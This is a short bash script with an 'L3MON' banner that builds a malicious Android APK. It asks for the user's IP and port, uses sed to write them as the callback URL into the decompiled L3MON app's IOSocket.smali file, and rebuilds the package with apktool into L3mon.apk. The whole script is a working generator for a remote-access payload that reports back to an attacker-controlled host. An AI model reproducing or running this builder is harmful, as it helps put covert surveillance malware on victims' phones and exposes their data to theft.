#!/bin/bash
echo
echo "******************************"
echo " _     _____ __  __  ___  _   _ 
| |   |___ /|  \/  |/ _ \| \ | |
| |     |_ \| |\/| | | | |  \| |
| |___ ___) | |  | | |_| | |\  |
|_____|____/|_|  |_|\___/|_| \_|"
echo "******************************"
echo
cd
echo -n "Your ip: "
read ips
echo -n "Your port: "
read ports

echo -e "const-string v3, \"http://$ips:$ports?model=\"" >.lmn.txt
chg=$(cat .lmn.txt)
sed -i "77 c $chg" $HOME/L3MON/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali
echo "Checking changes..."
sleep 3
cat $HOME/L3MON/app/factory/decompiled/smali/com/etechd/l3mon/IOSocket.smali |grep -E "http"

echo "Creating L3MON payload..."
echo "Please wait..."
sleep 3
cd
echo -n "Type output path: [ $PWD, /sdcard ]"
read pth
apktool b $HOME/L3MON/app/factory/decompiled/ -o $pth/L3mon.apk
echo "Stored in  $pth/L3mon.apk"
